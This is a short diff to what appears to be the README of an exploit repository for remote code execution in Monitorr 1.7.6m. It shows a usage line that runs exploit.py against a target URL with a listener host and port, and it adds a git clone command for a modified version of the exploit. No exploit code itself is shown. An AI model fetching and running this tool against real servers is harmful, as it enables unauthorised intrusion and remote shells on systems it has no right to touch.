@@ -5,4 +5,4 @@
 ### Usage
 ``python exploit.py https://domain.com LHOST PORT``
 
-``d``
+``git clone https://github.com/valentinodev/monitorr_1.7.6m_remote_code_execution_modified.git``
